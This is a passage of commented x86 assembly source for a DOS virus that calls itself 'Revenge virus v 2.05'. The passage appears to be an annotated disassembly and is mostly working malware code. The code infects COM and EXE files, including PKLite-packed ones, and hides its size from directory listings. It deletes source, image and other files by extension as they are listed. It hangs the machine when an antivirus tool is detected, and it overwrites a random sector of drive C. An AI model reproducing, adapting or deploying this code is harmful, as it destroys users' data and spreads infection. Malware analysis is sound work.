                   add     encrypted_byte,7Eh      ; Encrypt it
           pop dx
                   mov     ah,40h
                   call    lseekDX_functionAX      ; Write byte
                   jmp     store_header
           nop

                   db      'Don''t lose your header',0

   store_header:
           push    si
           push    di
           push    es
                   mov     si,offset(header)
                   mov     di,offset(header_exe)
                   mov     cx,e_header_exe-header_exe
           cld
           push    ds
           pop es
                   rep     movsb           ; Store header
           pop es
           pop di
           pop si
                   mov     ax,4202h
           xor cx,cx
           xor dx,dx
                   call    int_21          ; Lseek end
                   jnc     check_size_exe
                   jmp     close_file

   check_size_exe:
                   cmp     dx,0            ; > 64k?
                   jnz     check_big_exe   ; Yes? then jmp
           nop
           nop
           nop
                   cmp     ax,4000         ; >= 4000 bytes?
                   jae     check_big_exe   ; Yes? then jmp
                   jmp     close_file      ; No? then jmp (too small)

   check_big_exe:
                   cmp     dx,9            ; > 9*64k ?
                   jb      fix_header      ; No? then jmp
                   jmp     close_file      ; Yes? then jmp (too big)

   fix_header:
                   mov     size_exe_l,ax   ; Store file size
                   mov     size_exe_h,dx
           clc
                   add     ax,VIRUS_SIZE
           nop
                   adc     dx,0
                   mov     cx,512
                   div     cx              ; Calculate number of pages
                   mov     pagecnt,ax
                   inc     pagecnt         ; Not always!!!
                   mov     partpag,dx      ; Length of partial page at end
                   mov     ax,size_exe_l   ; Get original size
                   mov     dx,size_exe_h
                   mov     cx,16
                   div     cx              ; Calculate virus segment and IP
                   mov     exeip,dx        ; Virus IP
                   sub     ax,hdrsize
                   mov     relocs,ax       ; Virus segment
                   mov     reloss,ax       ; Stack segment
                   mov     exesp,0FFFEh    ; SP
           push    ax
                   mov     ax,exeip
                   mov     ofs_vircode,ax  ; Virus runtime offset
           pop ax
                   xor     dx,dx
                   xor     cx,cx
                   mov     ax,4200h
                   call    int_21          ; Lseek start
                   jnc     patch_pk_header?
                   jmp     close_file

   patch_pk_header?:
                   cmp     pklite_exe,1            ; Pklited exe?
                   jne     write_header_exe        ; No? then jmp
           nop
           nop
           nop
                   mov     ax,exeip
                   mov     pk_exe_ip,ax
                   mov     ax,relocs
                   add     ax,10h          ; Add PSP
                   mov     pk_exe_cs,ax
                   mov     ax,_exeip       ; Header points to Pklite code
                   mov     exeip,ax
                   mov     ax,_relocs
                   mov     relocs,ax
   write_header_exe:
                   mov     dx,offset(header_exe)
                   mov     cx,e_header_exe-header_exe
                   mov     ah,40h
                   call    int_21          ; Write new header
                   jnc     wrote_header_exe
                   jmp     close_file

   wrote_header_exe:
                   cmp     pklite_exe,1    ; Pklited exe?
                   je      patch_pkexe     ; Yes? then jmp
                   jmp     append_code

   patch_pkexe:
                   mov     ax,4200h
                   mov     dx,ofs_segcode
                   add     dx,29h
                   xor     cx,cx
                   call    int_21
                   mov     ah,40h          ; Lseek to code segment+29h
                   mov     cx,e_pkexe_patch-pkexe_patch
           nop
                   mov     dx,offset(pkexe_patch)
                   call    int_21          ; Write patch
                   jnc     patch2_pkexe
                   jmp     close_file

   patch2_pkexe:
                   mov     ax,4200h
                   mov     dx,ofs_segcode
                   add     dx,0Dh
                   xor     cx,cx
                   call    int_21          ; Lseek to code segment+0Dh
                   mov     ah,40h
                   mov     cx,1
                   mov     dx,offset(jmp_xx_pkexe)
                   call    int_21          ; Write jmp (force jmp to patched code)
                   jnc     jmp2_append_code
                   jmp     close_file

   jmp2_append_code:
                   jmp     append_code

   jmp_xx_pkexe    db      0EBh            ; jmp xx

   pkexe_patch:
                   mov     ax,es
                   add     cs:[135h],ax
                   jmp     $+2
                   db      0EAh            ; jmp far to virus start
   pk_exe_ip       dw      0
   pk_exe_cs       dw      0
   e_pkexe_patch:

   size_exe_l      dw      0
   size_exe_h      dw      0

   pklite_exe      db      0       ; 0 = Exe-file not compressed with Pklite
                                   ; 1 = Exe-file compressed with Pklite

   header_exe:
   signature       dw      0
   partpag         dw      0
   pagecnt         dw      0
   relocnt         dw      0
   hdrsize         dw      0
   minmem          dw      0
   maxmem          dw      0
   reloss          dw      0
   exesp           dw      0
   chksum          dw      0
   exeip           dw      0
   relocs          dw      0
   tabloff         dw      0
   overlay         dw      0
                   dw      0
                   dw      0
   e_header_exe:

                   db      'Just very slightly mad !',0

   ff_fn:
                   call    int_21
                   jnc     found_fffn
                   jmp     exit_fffn_preserve_AX

   found_fffn:
                   mov     ah,2Fh
                   call    int_21          ; Get DTA address in ES:BX
                   mov     cl,es:[bx+15h]  ; Get attributes
                   and     cl,10h
                   cmp     cl,10h          ; Subdirectory?
                   jne     no_directory    ; No? then jmp
                   jmp     exit_fffn

   no_directory:
                   mov     cx,es:[bx+16h]  ; Get file time
                   mov     dx,es:[bx+18h]  ; Get file date
           push    cx
                   mov     ax,dx           ; AX:=file date
                   mov     cl,5
                   shr     ax,cl
                   and     ax,0Fh          ; AX:=month
                   mov     dx,ax
                   pop     ax              ; AX:=file time
                   and     ax,1Fh          ; AX:=seconds
                   cmp     ax,dx           ; seconds=month? Infected?
                   jne     check_table_ext ; No? then jmp
           nop
           nop
           nop
                   cmp     word ptr es:[bx+1Ch],0  ; >64KB?
                   jne     restore_size            ; Yes? then jmp
           nop
           nop
           nop
                   cmp     es:[bx+1Ah],VIRUS_SIZE  ; >=virus size
                   jae     restore_size            ; Yes? then jmp
                   jmp     exit_fffn

   restore_size:
                   mov     ax,es:[bx+1Ah]
                   cmp     ax,VIRUS_SIZE
                                           ;  sub es:[bx+1Ah],VIRUS_SIZE
                                           ;  sbb es:[bx+1Ch],0 ?? ;)
                   nop
                   jb      cross_64k
           nop
           nop
           nop
                   jmp     no_cross_64k
           nop

   cross_64k:
                   dec     word ptr es:[bx+1Ch]
   no_cross_64k:
                   sub     es:[bx+1Ah],VIRUS_SIZE
                   jmp     check_table_ext
           nop

                   db      'I''m the invisible man',0

   check_table_ext:
                   mov     bp,offset(table_ext)
                   sub     bp,100h
                   mov     di,bx
                   add     di,1Eh          ; Point to filename
                   mov     si,di
   next_char_fname:
                   mov     ah,es:[di]
                   cmp     ah,0            ; End of filename?
                   jnz     cmp_dot         ; No? then jmp
           nop
           nop
           nop
                   jmp     exit_fffn

   cmp_dot:
                   cmp     ah,'.'          ; Extension?
                   je      found_extension ; Yes? then jmp
           nop
           nop
           nop
           inc di
                   jmp     next_char_fname

   found_extension:
                   inc     di              ; Point to extension
   l_next_extension:
                   mov     ax,cs:[bp]
                   cmp     ax,es:[di]      ; Extension in table?
                   je      cmp_last_ext    ; Maybe? then jmp
           nop
           nop
           nop
                   cmp     al,0FFh         ; End of table?
                   je      exit_fffn       ; Yes? then jmp
           nop
           nop
           nop
                   add     bp,3            ; Next
                   jmp     l_next_extension

   cmp_last_ext:
                   mov     ah,es:[di+2]
                   cmp     ah,cs:[bp+2]    ; Extension in table?
                   je      jmp_kill_file   ; Yes? then jmp
           nop
           nop
           nop
                   add     bp,3
                   jmp     l_next_extension

   jmp_kill_file:
                   jmp     kill_file
           nop

                   db      'Now you DiE !',0

   kill_file:
           push    es
                   xor     ax,ax
                   mov     es,ax                   ; ES:=0
                   mov     ax,es:[24h*4]           ; Read & store int 24h
                   mov     cs:ofs_i24-100h,ax
                   mov     ax,es:[24h*4+2]
                   mov     cs:seg_i24-100h,ax
                   mov     es:[24h*4],offset(int_24)-100h  ; Set new int 24h
                   mov     es:[24h*4+2],cs
           pop es
           push    es
           push    si
           pop dx
           pop ds
                   mov     ah,41h
                   call    int_21                  ; Delete file
           push    es
                   xor     ax,ax
                   mov     es,ax                   ; ES:=0
                   mov     ax,cs:ofs_i24-100h      ; Restore int 24h
                   mov     es:[24h*4],ax
                   mov     ax,cs:seg_i24-100h
                   mov     es:[24h*4+2],ax
           pop es
           push    si
           pop di
           cld
                   mov     ax,0A898h       ; Return 'shit !',0 in russian
           stosw
                   mov     ax,20E2h
           stosw
                   mov     ax,'!'          ; '!',0
           stosw
                   jmp     exit_fffn       ; Stupid jmp!!!
           nop

   exit_fffn:
           pop es
           pop ds
           pop di
           pop si
           pop bp
           pop dx
           pop cx
           pop bx
           pop ax
           popf
           clc
                   add     sp,6
                   jmp     exit_21h

   exit_fffn_preserve_AX:
                   mov     cs:returnAX_fffn-100h,ax        ; Preserve AX
           pop es
           pop ds
           pop di
           pop si
           pop bp
           pop dx
           pop cx
           pop bx
           pop ax
           pop ax
                   mov     ax,cs:returnAX_fffn-100h        ; Return AX
                   add     sp,6
           stc
                   jmp     exit_21h

   popregs_iret:
           pop es
           pop ds
           pop di
           pop si
           pop bp
           pop dx
           pop cx
           pop bx
           pop ax
           popf
                   iret

   ofs_i24         dw      0
   seg_i24         dw      0

   restore_exec_host:
           pop es
           pop ds
                   cmp     cs:[si+host_type],1     ; EXE?
                   je      restore_exe             ; Yes? then jmp
                   nop                             ; It's COM
           nop
           nop
                   cmp     cs:[si+encrypted_byte?],0FFh    ; Byte encrypted?
                   je      decrypt_byte190                 ; Yes? then jmp
           nop
           nop
           nop
                   mov     ax,103h         ; Initial call return address
                                           ; If not encrypted it starts with 'call'
           push    ax
                   jmp     restore_com
           nop

   decrypt_byte190:
                   mov     al,cs:[si+encrypted_byte]
                   sub     al,53h                  ; Decrypt byte
                   mov     cs:[190h+100h],al       ; Restore code in memory
   restore_com:
                   mov     ax,cs:[si+jmp_dest]
                   add     ax,100h                 ; Host entry point
                   push    ax
           push    si
                   add     si,100h                 ; Remove virus from memory
                   mov     cx,offset(delmem_here)-100h
                   call    remove_from_memory
   delmem_here:
                   pop     si
                   add     si,offset(restore_exe)
                   mov     cx,virus_end-restore_exe
                   call    remove_from_memory
                   ret                             ; Return to host

   remove_from_memory:
           push    cx
   l_del_mem:
                   mov     byte ptr cs:[si],'#'    ; Remove copy virus from memory
           inc si
                   loop    l_del_mem
           pop cx
           ret

           db 'All dead...',0

   restore_exe:
                   sub     byte ptr ds:[512+100h],7Eh      ; Decrypt byte
                   cmp     cs:[si+pklite_exe],1    ; Pklited file?
                   jne     no_pk_host_exe          ; No? then jmp
           nop
           nop
           nop
                   mov     ds:[0Dh+100h],9090h     ; Remove patch

   no_pk_host_exe:
           push    ax
           mov ax,ds
                   add     ax,10h                  ; Add PSP
                   add     cs:[si+_reloss],ax      ; Relocate segments
                   add     cs:[si+_relocs],ax
                   mov     ax,cs:[si+_exeip]
                   mov     cs:[si+file_ip],ax
                   mov     ax,cs:[si+_relocs]
                   mov     cs:[si+file_cs],ax
                   mov     ax,cs:[si+_exesp]
                   mov     cs:[si+file_sp],ax
                   mov     ax,cs:[si+_reloss]
                   mov     cs:[si+file_ss],ax
           pop ax
           push    si
                   add     si,100h
                   mov     cx,offset(delmem_here)-100h ; offset(delmem_here2) !!!
                   call    remove_from_memory
   ;delmem_here2:
                   pop     si
           push    si
                   add     si,offset(check_valid_fname)
                   mov     cx,virus_end-check_valid_fname
                   call    remove_from_memory
           pop si
           cli
                   mov     sp,cs:[si+file_sp]              ; Set stack
                   mov     ss,cs:[si+file_ss]
           sti
                   jmp     dword ptr cs:[si+file_ip]       ; Exec host

   file_ip         dw      0
   file_cs         dw      0
   file_sp         dw      0
   file_ss         dw      0

   check_valid_fname:
           push    ds
           push    si
           push    di
           push    bx
                   mov     di,dx
                   mov     si,offset(av_table)
                   sub     si,100h
                   mov     bx,di

   l_search_fname:
                   cmp     byte ptr [di],0         ; End of string?
                   jz      end_search              ; Yes? then jmp
           nop
           nop
           nop
                   cmp     byte ptr [di],'\'       ; Start of directory/file name?
                   je      mark_position           ; Yes? then jmp
           nop
           nop
           nop
   next_search_fname:
           inc di
                   jmp     l_search_fname

   mark_position:
                   mov     bx,di
                   jmp     next_search_fname

   end_search:
           inc bx
   next_inv_fname:
                   mov     ax,cs:[si]      ; Get 2 chars from table
                   cmp     ax,'##'         ; End of table?
                   je      valid_fname     ; Yes? then jmp
           nop
           nop
           nop
                   cmp     [bx+1],'DI'     ; '?ID*.*' ? (AIDTEST?)
                   jne     check_table     ; No? then jmp
                   jmp     print_msg_russ  ; Yes? then jmp

   check_table:
                   cmp     ax,[bx]         ; Invalid filename (in table)?
                   je      invalid_fname   ; Yes? then jmp
           nop
           nop
           nop
                   inc     si              ; Next table entry
           inc si
                   jmp     next_inv_fname

   valid_fname:
           pop bx
           pop di
           pop si
           pop ds
           ret

   invalid_fname:
           pop bx
           pop di
           pop si
           pop ds
           pop ax
                   jmp     restore_attr

   convert2uppercase:
           push    di
           push    ax

   l_c2up:
                   mov     ah,[di]
                   cmp     ah,0            ; End of string?
                   jz      exit_c2up       ; Yes? then jmp
           nop
           nop
           nop
                   cmp     ah,'a'          ; In lowercase?
                   jb      next_c2up       ; No? then jmp
           nop
           nop
           nop
                   cmp     ah,'z'          ; In lowercase?
                   ja      next_c2up       ; No? then jmp
           nop
           nop
           nop
                   sub     ah,' '          ; Convert in uppercase
   next_c2up:
                   mov     [di],ah
           inc di
                   jmp     l_c2up

   exit_c2up:
           pop ax
           pop di
           ret

                   db      'Crazy Little Thing Called PkLite',0

   check4pklite_com:
           push    di
           push    ax
           push    cx
                   xor     di,di
                   cmp     byte ptr [di+header],50h        ; PUSH AX? (PKL 1.50+)
                   jne     no_pk150                        ; No? then jmp
           nop
           nop
           nop
                   inc     di                              ; Skip 'push ax'
   no_pk150:
                   cmp     byte ptr [di+header],0B8h       ; MOV AX,xxxx?
                   jne     no_pklite                       ; No? then jmp
           nop
           nop
           nop
                   cmp     byte ptr [di+header+3],0BAh     ; MOV DX,xxxx?
                   jnz     no_pklite                       ; No? then jmp
           nop
           nop
           nop
                   mov     di,offset(header)+7
                   mov     cx,16
                   xor     ax,ax
   l_crc_pkl:
                   add     al,[di]         ; Make CRC of code
           inc di
                   loop    l_crc_pkl
                   cmp     al,53h          ; PKLite 1.00?
                   je      pk_100          ; Yes? then jmp
           nop
           nop
           nop
                   cmp     al,0E5h         ; PKLite 1.15?
                   je      pk_115          ; Yes? then jmp
           nop
           nop
           nop
                   cmp     al,9Dh          ; PKLite 1.50?
                   jz      pk_150          ; Yes? then jmp
           nop
           nop
           nop
                   jmp     no_pklite
           nop

   pk_100:
                   mov     ofs_patchcom2,71h
                   mov     inc_ofs_patch1,0        ; Dir patch+0
                   jmp     pklite_found
           nop

   pk_115:
                   mov     ofs_patchcom2,73h
                   mov     inc_ofs_patch1,0        ; Dir patch+0
                   jmp     pklite_found
           nop

   pk_150:
                   mov     ofs_patchcom2,84h
                   mov     inc_ofs_patch1,1        ; Dir patch+1
   pklite_found:
           clc
                   jmp     pklite
           nop

   no_pklite:
           stc
   pklite:
           pop cx
           pop ax
           pop di
                   ret


   check4pklite_exe:
                   cmp     _relocs,0FFF0h  ; CS segment=0FFF0h? (like pklited file)
                   jne     not_found_pkexe ; No? then jmp
           nop
           nop
           nop
                   cmp     _exeip,100h     ; IP=100h? (like pklited files)
                   jne     not_found_pkexe ; No? then jmp
                   nop                     ; Yes? Seems to be a pklited exe file
           nop
           nop
                   mov     ax,4200h
                   mov     cl,4
                   mov     dx,_hdrsize
                   shl     dx,cl           ; header size * 16 = start of code
                   mov     ofs_segcode,dx
                   add     dx,6            ; Skip 6 bytes
                   xor     cx,cx
                   call    int_21          ; Lseek to end of header+6
                   mov     ah,3Fh
                   mov     dx,offset(buffer_pkexe)
                   mov     cx,0Ah
                   call    int_21          ; Read from file
                   mov     si,offset(pkexe_code)
                   mov     di,offset(buffer_pkexe)
                   mov     cx,0Ah
   l_cmp_pkcode:
                   mov     al,[si]
                   cmp     al,[di]         ; Check if it's a pklited exe file
                   jne     not_found_pkexe ; No? then jmp
           nop
           nop
           nop
           inc di
           inc si
                   loop    l_cmp_pkcode
           clc
           ret

   not_found_pkexe:
           stc
           ret

   buffer_pkexe:
                   db      0
                   db      0
                   db      0
                   db      0
                   db      0
                   db      0
                   db      0
                   db      0
                   db      0
                   db      0

                   db      0
                   db      0

   pkexe_code:
   ;               add     ax,0
   ;               cmp     ax,[2]
   ;               jnb     $+1Ch
   ;               sub     ax,0

                   db      5
                   db      0
                   db      0
                   db      3Bh
                   db      6
                   db      2
                   db      0
                   db      73h
                   db      1Ah
                   db      2Dh
   ofs_segcode     dw      0


   print_msg_russ:
                   push    cs
           pop ds
                   mov     ah,9
                   mov     dx,offset(msg_russian)-100h
                   call    int_21          ; Print msg
           cli
                   hlt                     ; Hang computer

   print_REVENGE:
                   mov     ax,3
                   int     10h             ; VIDEO: Change mode to 80x25 16col.
                   mov     ax,40h          ; why??
                   mov     es,ax           ; why??
                   mov     cx,0FFFFh
                   mov     ah,1
                   int     10h     ; VIDEO: Set cursor characteristics
                                   ; CH bits 0-4 = start line in character cell
                                   ; bits 5-6 = blink attribute
                                   ; CL bits 0-4 = end line in character cell
                   mov     ax,0B800h
                   mov     es,ax                   ; ES:=video memory segment
                   mov     di,(3*80+28)*2          ; gotoxy(28,3)
                   mov     si,offset(this_is)
   write_this_is:
                   mov     ah,[si]
                   cmp     ah,0            ; End of string?
                   jz      wrote_this_is   ; Yes? then jmp
           nop
           nop
           nop
                   mov     es:[di],ah      ; Write char to screen
                   add     di,3*2          ; 2 chars between letters
           inc si
                   jmp     write_this_is

   wrote_this_is:
                   mov     di,(6*80)*2     ; gotoxy(0,6)
                   mov     bx,di
                   mov     si,offset(revenge)
                   mov     cx,12           ; 12 lines
   l_revenge_line:
                   mov     al,[si]
                   cmp     al,0                    ; End of line?
                   je      new_revenge_line        ; Yes? then jmp
           nop
           nop
                   nop
                   cmp     al,' '          ; Space?
                   jne     cmp_b1          ; No? then jmp
           nop
           nop
           nop
                   mov     ah,0            ; Color: black
                   jmp     write_charAL_colorAH
           nop

   cmp_b1:
                   cmp     al,'±'          ; ± code?
                   jne     cmp126          ; No? then jmp
           nop
           nop
           nop
                   mov     ah,0C0h         ; Blink ±
                   jmp     write_charAL_colorAH
           nop

   cmp126:
                   cmp     al,'~'          ; ~ code?
                   jne     cmpp            ; No? then jmp
                   jmp     code126p

   cmpp:
                   cmp     al,'#'          ; '#' code?
                   jne     cmp_d           ; No? then jmp
                   jmp     code126p

   cmp_d:
                   cmp     al,'d'          ; 'd' code?
                   jne     cmp_w           ; No? then jmp
           nop
           nop
           nop
                   mov     ah,0C0h         ; Blink
                   mov     al,'±'
                   jmp     write_2chars

   cmp_w:
                   cmp     al,'w'          ; 'w' code?
                   jne     cmpadm
           nop
           nop
                   nop
                   mov     ah,4            ; Color: red
                   mov     al,'ß'
                   jmp     write_2chars

   cmpadm:
                   cmp     al,'!'          ; '!' code?
                   jne     no_special_char ; No? then jmp
           nop
           nop
           nop
                   xor     ax,ax           ; Char 0, color black
                   jmp     write_2chars

   no_special_char:
                   mov     ah,4            ; Color: red
   write_charAL_colorAH:
                   mov     es:[di],ax
           inc di
           inc di
           inc si
                   jmp     l_revenge_line

   new_revenge_line:
                   add     bx,80*2         ; Next screen line
                   mov     di,bx
           inc si
                   loop    l_revenge_line
                   mov     di,(20*80+6)*2  ; gotoxy(6,20)
                   mov     si,offset(of_SSR)
   write_of_SSR:
                   mov     ah,[si]
                   cmp     ah,0            ; End of string?
                   jz      wrote_of_SSR    ; Yes? then jmp
           nop
           nop
           nop
                   mov     es:[di],ah      ; Write char to screen
                   add     di,3*2          ; 2 chars between letters
           inc si
                   jmp     write_of_SSR

   wrote_of_SSR:
                   mov     cx,200          ; !?
                   mov     si,1
           sti
   change_line_colors:
                   mov     di,(20*80+5)*2  ; gotoxy(20,5)
                   mov     cx,68
   l_set_colors:
           push    cx
                   mov     ah,cl           ; Calculate color
                   mov     cl,4
                   mov     bx,si
                   add     ah,bl
                   shl     ah,cl
                   shr     ah,cl
                   cmp     ah,0            ; Black?
                   jnz     no_black        ; No? then jmp
           nop
           nop
           nop
                   mov     ah,1            ; Skip black
   no_black:
                   mov     es:[di+1],ah    ; Set char color
           pop cx
                   inc     di              ; Next char
           inc di
                   loop    l_set_colors
                   call    delay
                   inc     si              ; New colors
                   in      al,60h          ; AT Keyboard controller 8042.
                   cmp     al,1                    ; ESC key pressed?
                   jne     change_line_colors      ; No? then jmp
                   jmp     print_msg_and_kill_sector
           nop

   delay:
                   mov     cx,0FFFFh
                   loop    $
                   mov     cx,0FFFFh
                   loop    $
                   mov     cx,0FFFFh
                   loop    $
           ret

   code126p:
           push    cx
                   mov     cl,[si+1]       ; Number of chars to repeat
                   cmp     al,'~'
                   jne     codep
                   nop                     ; '~' char
           nop
           nop
                   mov     ah,0            ; Color: Black
                   jmp     l_repeat_char
           nop

   codep:
                   mov     ah,0C0h         ; Blink
                   mov     al,'±'
   l_repeat_char:
                   cmp     cl,0            ; More chars?
                   jz      end_repeat_char ; No? then jmp
           nop
           nop
           nop
                   mov     es:[di],ax      ; Write char
           inc di
           inc di
           dec cl
                   jmp     l_repeat_char

   end_repeat_char:
           inc si
           inc si
           pop cx
                   jmp     l_revenge_line

   write_2chars:
                   mov     es:[di],ax              ; Write char
                   inc     di
           inc di
                   jmp     write_charAL_colorAH    ; Write another char

   print_msg_and_kill_sector:
                   mov     ax,2
                   int     10h             ; VIDEO: Change mode to 80x25 B&W
                   mov     al,3
                   int     10h             ; VIDEO: Change mode to 80x25 16col.
                   mov     ah,1
                   mov     cx,2000h        ; Invisible cursor
                   int     10h             ; VIDEO: Set cursor characteristics
                   mov     cx,0
                   mov     di,(9*80+8)*2   ; gotoxy(8,9)
                   mov     si,offset(release_msg)
                   mov     ax,0B800h
                   mov     es,ax           ; Point to video memory
   l_print_version:
           push    di
                   call    print_string
           pop di
                   add     di,80*2         ; Next screen line
           inc si
                   add     cx,1            ; Next line (inc cx!!)
                   cmp     cx,4            ; 4 lines printed?
                   jne     l_print_version
                   mov     ax,40h
                   mov     es,ax           ; ES:=40h
                   mov     dx,es:[6Ch]     ; Random sector
                   mov     cx,1            ; 1 sector
                   mov     al,2            ; C:
                   int     26h             ; DOS - ABSOLUTE DISK WRITE
                                           ; AL = drive number (0=A, 1=B, etc),
                                           ; DS:BX = Disk Transfer Address (buffer)
                                           ; CX = number of sectors to write,
                                           ; DX = first relative sector to write
                                           ;  Overwrite random sector
           cli
                   hlt                     ; Hang computer

   print_string:
                   mov     al,[si]
                   mov     ah,11
                   add     ah,cl           ; Line 1: color 11 -> blue
                                           ; Line 2: color 12 -> red
                                           ; Line 3: color 13 -> pink
                                           ; Line 4: color 14 -> yellow
                   cmp     al,'#'          ; Special code?
                   je      skip_chars      ; Yes? then jmp
           nop
           nop
           nop
                   cmp     al,0                    ; End of string?
                   jz      end_print_string        ; Yes? then jmp
           nop
           nop
           nop
                   mov     es:[di],ax      ; Print char
           inc si
           inc di
           inc di
                   jmp     print_string

   end_print_string:
           ret

   skip_chars:
                   mov     al,[si+1]       ; Number of chars to skip
                   shl     al,1            ; 2 bytes per each char
                   mov     ah,0
                   add     di,ax           ; Skip chars
           inc si
           inc si
           inc di
           inc di
                   jmp     print_string

   encrypt_i1:
           push    cx
           push    ax
           push    si
           push    di
           push    es
                   mov     si,offset(encrypt_instructions)
                   mov     di,offset(enc_inst)
                   mov     al,enc_selector
                   ror     al,1
                   mov     enc_selector,al
                   mov     cl,6
                   shl     al,cl
                   shr     al,cl
                   mov     cl,3
           mul cl
                   add     si,ax
                   call    copy_enc_inst
           pop es
           pop di
           pop si
           pop ax
           pop cx
           ret

   copy_enc_inst:
           cld
                   mov     cx,3
           push    ds
           pop es
                   rep     movsb
                   ret

   enc_selector    db      0

   this_is         db      'THIS IS',0
   of_SSR          db      'OF',9,'STAINLESS STEEL RAT',0

   revenge:        ; Compressed graphic
   ; Line 1
           db      '~',7,'Þ','d',' ','#',5,'~',9,'Þ','d',0,'~',7,'Þ','#',3,'w'
           db      'ß','Û','d',' ','Ü','#',5,'!','Þ','d','~',4,'Þ','d','!','Ü'
           db      '#',5,'!','Þ','d',' ','#',4,'~',3,'#',4,' ','d','!','Ü','#',5,0
   ; Line 2
           db      '~',7,'Û','#',3,'~',3,'Þ','d','Þ','d','w','Û','d',' ','Þ','d'
           db      '~',4,'Þ','d',' ','Þ','d','w','Û','d',' ','Þ','#',3,'w','Û','d'
           db      'Þ','d','w','ß','#',3,' ','Þ','d','w','Û','d',0
   ; Line 3
           db      '~',6,'Þ','#',3,'~',3,'Þ','d',' ','Þ','d','!','Þ','d','!','Û'
           db      '±','~',3,'Þ','d','!','Þ','d','!','Þ','d',' ','Þ','d','~',3
           db      'Þ','d','Þ','d','~',3,'Þ','d',' ','Þ','d','!','Þ','d',0
   ; Line 4
           db      '~',6,'Û','#',7,'!','Þ','#',7,'~',3,'Þ','d','!','Þ','d',' ','Þ'
           db      '#',7,'!','Þ','d','~',3,'Þ','d',' ','Û','#',7,'Þ','#',7,0
   ; Line 5
           db      '~',5,'Þ','#',3,' ','Þ','d','~',3,'Þ','#',3,'w','ß','~',5,'Þ'
           db      'd',' ','Þ','±','!','Þ','#',3,'w','ß','~',3,'Þ','d','~',3,'Þ'
           db      'd','!','w','#',5,'Þ','#',3,'w','ß',0
   ; Line 6
           db      '~',5,'Þ','d','~',3,'Û','d','~',3,'Û','d','~',4,'±','~',4,'Þ'
           db      'd','Þ','±','~',3,'Û','d','~',4,'±',' ','Þ','d',' ',' ','Þ','d'
           db      '~',5,'w','ß','Û','±',' ','Û','d','~',4,'±',0
   ; Line 7
           db      '~',5,'Û','d','~',4,'Û','d','~',3,'Û','#',5,'~',6,'Þ','d','~',5
           db      'Û','#',5,'!','Þ','d','!','Þ','d','~',3,'±','~',3,'Þ','d','!'
           db      'Û','#',5,0
   ; Line 8
           db      '~',4,'Þ','#',3,'~',5,'Û','d','~',3,'w','w','~',8,'w','~',6,'w'
           db      'w','~',4,'w','~',3,'w',' ',' ','d','~',3,'Þ','d','~',3,'w','w'
           db      0
   ; Line 9
           db      '~',4,'Û','d','~',7,'Û','d','~',27h,'Þ','#',6,0
   ; Line 10
           db      '~',4,'w','ß','~',8,'Û','d','~',27h,'w','w','ß','!',0
   ; Line 11
           db      '~',10h,'Û','d',0
   ; Line 12
           db      '~',10h,'w',0

   ; Uncompressed graphic:
   ;
   ;                          T  H  I  S     I  S
   ;
   ;     Þ±± ±±±±±         Þ±±
   ;     Þ±±±ßßßÛ±± Ü±±±±±  Þ±±    Þ±±  Ü±±±±±  Þ±± ±±±±   ±±±± ±±  Ü±±±±±
   ;     Û±±±   Þ±±Þ±±ßßÛ±± Þ±±    Þ±± Þ±±ßßÛ±± Þ±±±ßßÛ±±Þ±±ßßß±±± Þ±±ßßÛ±±
   ;    Þ±±±   Þ±± Þ±±  Þ±±  Û±   Þ±±  Þ±±  Þ±± Þ±±   Þ±±Þ±±   Þ±± Þ±±  Þ±±
   ;    Û±±±±±±±  Þ±±±±±±±   Þ±±  Þ±± Þ±±±±±±±  Þ±±   Þ±± Û±±±±±±±Þ±±±±±±±
   ;   Þ±±± Þ±±   Þ±±±ßßß     Þ±± Þ±  Þ±±±ßßß   Þ±±   Þ±±  ßß±±±±±Þ±±±ßßß
   ;   Þ±±   Û±±   Û±±    ±    Þ±±Þ±   Û±±    ± Þ±±  Þ±±     ßßßÛ± Û±±    ±
   ;   Û±±    Û±±   Û±±±±±      Þ±±     Û±±±±±  Þ±±  Þ±±   ±   Þ±±  Û±±±±±
   ;  Þ±±±     Û±±   ßßßß        ßß      ßßßß    ßß   ßß  ±±   Þ±±   ßßßß
   ;  Û±±       Û±±                                       Þ±±±±±±
   ;  ßßß        Û±±                                       ßßßßß
   ;              Û±±
   ;
   ;    O  F           S  T  A  I  N  L  E  S  S    S  T  E  E  L     R  A  T

   release_msg:
           db  'úúúúùùù Revenge virus v 2.05 released at 08.08.96 ùùùúúúú',0
           db  'úúúúùùù Copyright (c) 1996-97  2 Rats Techno Soft ùùùúúúú',0
           db  'úúúúùùù#',11h,          'Written by#',0Eh,       'ùùùúúúú',0
           db  'úúúúùùù#',0Dh,      'Stainless Steel Rat#',9,    'ùùùúúúú',0

                   db      'StealthedMetamorphicCrazyForcedSynthesatedRandom'
                   db      'MegaLayerEncryptionProgressionMutationEngine'
                   db      'SeekAndDestroyerGenerator',0

   msg_russian     db '’ë ¥é¥ ¥ ¢ë¡p®á¨« íâ®â suxx   ¯®¬®©ªy ?! :)',7,'$'

   header:
   _signature      dw      0C3h
   _partpag        dw      9090h
   _pagecnt        dw      20CDh
   _relocnt        dw      0
   _hdrsize        dw      0
   _minmem         dw      0
   _maxmem         dw      0
   _reloss         dw      0
   _exesp          dw      0
   _chksum         dw      0
   _exeip          dw      0
   _relocs         dw      0
   _tabloff        dw      0
   _overlay        dw      0
   word_ofs1C      dw      0
                   dw      0

                   dw      0       ; Unused!
                   dw      0       ; Unused!
                   dw      0       ; Unused!

   jmp_com         db      0E9h    ; JMP xxxx (JMP start virus)
   jmp_vir_l       db      0
   jmp_vir_h       db      0

                   db      'Ÿ ¬áâî ,¨ ¬áâï ¬®ï ã¦ á ... ü S.S.R.'

   file_month      dw      0
   returnAX_fffn   dw      0
   attributes      dw      0
   pklite_com      db      0       ; 0 = Not compressed with Pklite
                                   ; 1 = Compressed with Pklite
   jmp_dest        dw      0
   ofs_patchcom2   dw      0
   inc_ofs_patch1  dw      0
   encrypted_byte? db      0       ; 0FFh -> Yes
                                   ; 0    -> No

                   db      0       ; Unused!
   _FFFF           dw      0FFFFh
   infection_count dw      0
   encrypted_byte  db      0
   host_type       db      0       ; 0 = COM
                                   ; 1 = EXE
   ofs_vircode     dw      0

   table_ext:
                   db      'PAR'   ; Windows swap file
                   db      'PIF'   ; Windows PIF
                   db      'ICO'   ; Windows Icon
                   db      '°°°'   ; ???
                   db      'PAS'   ; Pascal sources
                   db      'BAS'   ; Basic sources
                   db      'FRQ'   ; ???
                   db      '311'   ; ???
                   db      '312'   ; ???
                   db      'TPU'   ; Turbo Pascal Units
                   db      'GIF'   ; GIF graphic format
                   db      'JPG'   ; JPG graphic format
                   db      'NLM'   ; Novell Netware (?)
